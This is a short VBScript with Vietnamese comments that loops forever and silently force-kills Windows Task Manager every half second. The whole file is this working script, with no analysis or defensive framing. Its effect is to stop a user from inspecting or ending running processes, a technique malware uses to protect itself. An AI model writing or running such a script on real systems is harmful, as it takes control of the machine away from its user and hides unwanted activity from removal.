Set WshShell = CreateObject("WScript.Shell")

Do
    ' Dùng lệnh taskkill của Windows để tắt Task Manager nếu nó đang mở
    WshShell.Run "taskkill /f /im taskmgr.exe", 0, True
    
    ' Nghỉ 0.5 giây rồi quét tiếp
    WScript.Sleep 500
Loop
